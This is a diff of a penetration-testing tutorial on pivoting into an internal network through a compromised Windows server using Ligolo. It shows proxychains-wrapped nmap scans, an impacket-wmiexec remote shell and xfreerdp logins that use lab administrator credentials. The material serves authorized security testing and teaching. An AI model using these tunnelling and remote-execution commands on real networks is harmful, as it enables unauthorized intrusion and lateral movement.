@@ -1,7 +1,7 @@
 
-======================================================================================================
+===========================================================================================================================================
 Pivoting with Ligolo on a Windows server (basic example)
-======================================================================================================
+===========================================================================================================================================
 
 => Github page "https://github.com/sysdream/ligolo"
 
@@ -13,13 +13,13 @@ Context
 --------
 During a penetration test, you managed to hack a vulnerable Internet-facing system (e.g. insecure website, misconfigured/unpatched Exchange server or Citrix server)
 and you are able to run OS commands on the underlying Windows server.
-This Windows server is located inside your client's internal network (protected by a firewall) and you want to establish a tunnel between your pentester machine 
+This Windows server is located inside your client's internal network (protected by a firewall) and you want to establish a tunnel between your attack server 
 (e.g. Kali Linux VM in AWS) and this Windows server to be able to access to the internal network (like you were remotely connected with a VPN client).
 
 
-======================================================================================================
-Step 1 - Build the 2 Ligolo binaries (the localrelay and the client)
-======================================================================================================
+===========================================================================================================================================
+Step 1 - Build the 2 Ligolo binaries: the 'localrelay' to run on your attack server and the ligolo client to run on the compromised server
+===========================================================================================================================================
 
 Follow instrcutions available in the Github page "https://github.com/sysdream/ligolo"
 
@@ -193,8 +193,8 @@ time="2022-08-07T02:58:21+02:00" level=info msg="Accepted new connection !" acti
 Step 4 - Use Proxychains on your attack server (e.g. Kali VM) and the tunnel established with Ligolo to pivot to the internal network
 ======================================================================================================================================
 
-Example 1 - Nmap port scans
--------------------------------------------
+Example 1 - Nmap port scans of internal servers over the ligolo tunnel
+--------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools$ proxychains nmap -sT -n -p 445,3389 X.X.1.113
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -227,8 +227,8 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
 
 
-Example 2 - wmiexec (impacket)
--------------------------------------------
+Example 2 - wmiexec (impacket) connection to an internal server over the ligolo tunnel
+---------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools$ proxychains impacket-wmiexec test-lab/administrator:Test1234@X.X.1.64
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -249,8 +249,9 @@ test-lab\administrator
 C:\>
 
 
-Example 3 - xfreerdp
--------------------------------------------
+Example 3 - RDP connection to an internal server over the ligolo tunnel
+--------------------------------------------------------------------------------
+
 
 jeff@kali:~/Documents/Tools$ proxychains xfreerdp /f /u:administrator /p:Test1234 /v:X.X.1.64:3389
 ProxyChains-3.1 (http://proxychains.sf.net)
